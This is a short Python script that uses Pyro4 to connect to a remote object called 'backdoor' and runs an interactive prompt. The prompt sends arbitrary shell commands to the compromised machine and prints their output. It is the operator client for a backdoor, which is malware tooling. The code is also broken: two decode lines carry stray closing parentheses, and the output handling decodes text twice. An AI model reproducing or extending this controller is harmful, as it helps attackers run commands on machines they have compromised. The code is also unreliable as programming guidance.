import Pyro4
import sys
import codecs
import cmd

#backdoor = Pyro4.Proxy('PYRO:backdoor@localhost:53204')

URI = sys.argv[1]
backdoor = Pyro4.Proxy(URI)

#backdoor.execute('cmd /c dir')
#Executer
class Client(cmd.Cmd):
    prompt = '> '
    def do_exec(self, c):
        out, err = backdoor.execute(c)
        out = codecs.decode(bytes(out['data'],'utf-16be'),out['encoding']))
        err = codecs.decode(bytes(err['data'],'ascii'),err['encoding']))
        print('Output:\n%s' % out.decode('utf-8'))
        if len(err):
            print('Error:\n%s' % err.decode('utf-8'))

Client().cmdloop()
#rawcat
